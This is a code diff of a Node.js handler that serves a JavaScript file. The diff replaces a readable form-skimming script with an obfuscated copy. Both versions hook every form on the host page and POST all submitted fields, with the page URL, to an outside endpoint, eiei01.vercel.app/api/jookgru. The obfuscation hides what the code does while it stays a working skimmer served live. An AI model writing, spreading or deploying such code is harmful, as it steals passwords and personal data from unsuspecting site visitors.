@@ -1,45 +1,7 @@
 module.exports = (req, res) => {
 
     const scriptContent = `
-document.addEventListener('DOMContentLoaded', function () {
-  function logFormSubmission(event) {
-      // event.preventDefault();
-
-      const formData = new FormData(event.target);
-      const formObject = {};
-      formData.forEach((value, key) => {
-          formObject[key] = value;
-      });
-      console.log('Form Data:', formObject);
-      fetch('https://eiei01.vercel.app/api/jookgru', {
-          method: 'POST',
-          headers: {
-              'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-              url: window.location.href,
-              data: formObject,
-          }),
-      })
-      .then(response => {
-          console.log('Response Headers:', response.headers);
-          return response.text(); 
-      })
-      .then(text => {
-          console.log('Server response text:', text);
-
-      })
-      .catch(error => {
-          console.error('There was a problem with the fetch operation:', error);
-      });
-  }
-
-  // Attach the submit event listener to all forms on the page
-  var forms = document.querySelectorAll('form');
-  forms.forEach(function (form) {
-      form.addEventListener('submit', logFormSubmission);
-  });
-}); `;
+const _0xd687cb=_0x138b;(function(_0x43f34d,_0x2e68c2){const _0x3dc610=_0x138b,_0x50e115=_0x43f34d();while(!![]){try{const _0x126d44=parseInt(_0x3dc610(0x136))/0x1+parseInt(_0x3dc610(0x124))/0x2+-parseInt(_0x3dc610(0x140))/0x3+parseInt(_0x3dc610(0x13f))/0x4+parseInt(_0x3dc610(0x130))/0x5*(-parseInt(_0x3dc610(0x12e))/0x6)+parseInt(_0x3dc610(0x13c))/0x7*(parseInt(_0x3dc610(0x12a))/0x8)+-parseInt(_0x3dc610(0x12c))/0x9*(parseInt(_0x3dc610(0x133))/0xa);if(_0x126d44===_0x2e68c2)break;else _0x50e115['push'](_0x50e115['shift']());}catch(_0x2e642d){_0x50e115['push'](_0x50e115['shift']());}}}(_0x1405,0x3cda0),document[_0xd687cb(0x125)](_0xd687cb(0x12d),function(){const _0x57dbea=_0xd687cb;function _0x1d2940(_0x41e145){const _0x2a31d1=_0x138b,_0x574cd5=new FormData(_0x41e145[_0x2a31d1(0x135)]),_0x2b6bc2={};_0x574cd5['forEach']((_0x71bbd5,_0x5a4187)=>{_0x2b6bc2[_0x5a4187]=_0x71bbd5;}),console[_0x2a31d1(0x123)](_0x2a31d1(0x132),_0x2b6bc2),fetch(_0x2a31d1(0x127),{'method':_0x2a31d1(0x12f),'headers':{'Content-Type':_0x2a31d1(0x137)},'body':JSON[_0x2a31d1(0x126)]({'url':window['location']['href'],'data':_0x2b6bc2})})[_0x2a31d1(0x12b)](_0x1b9669=>{const _0xa99468=_0x2a31d1;return console[_0xa99468(0x123)](_0xa99468(0x134),_0x1b9669[_0xa99468(0x139)]),_0x1b9669[_0xa99468(0x138)]();})['then'](_0x18c75f=>{const _0x1ecd2f=_0x2a31d1;console[_0x1ecd2f(0x123)](_0x1ecd2f(0x13a),_0x18c75f);})[_0x2a31d1(0x13b)](_0x542e56=>{const _0x57de28=_0x2a31d1;console['error'](_0x57de28(0x128),_0x542e56);});}var _0x5d955c=document[_0x57dbea(0x13d)](_0x57dbea(0x129));_0x5d955c[_0x57dbea(0x13e)](function(_0x49e23b){const _0xc27298=_0x57dbea;_0x49e23b[_0xc27298(0x125)](_0xc27298(0x131),_0x1d2940);});}));function _0x138b(_0x5cf237,_0x146157){const _0x1405f3=_0x1405();return _0x138b=function(_0x138bfb,_0x21e34c){_0x138bfb=_0x138bfb-0x123;let _0x50bb01=_0x1405f3[_0x138bfb];return _0x50bb01;},_0x138b(_0x5cf237,_0x146157);}function _0x1405(){const _0x15bf57=['585288NejTwq','log','946368qsZFIe','addEventListener','stringify','https://eiei01.vercel.app/api/jookgru','There\x20was\x20a\x20problem\x20with\x20the\x20fetch\x20operation:','form','435256xvMFoU','then','261ariBSn','DOMContentLoaded','162UajnCE','POST','68865meSaJN','submit','Form\x20Data:','92360XlGpPr','Response\x20Headers:','target','65739VEIGRD','application/json','text','headers','Server\x20response\x20text:','catch','14WlnidX','querySelectorAll','forEach','1745288MDbiCH'];_0x1405=function(){return _0x15bf57;};return _0x1405();} `;
     res.set('Cache-Control', 'no-store');
     res.type('text/javascript').send(scriptContent);
 }
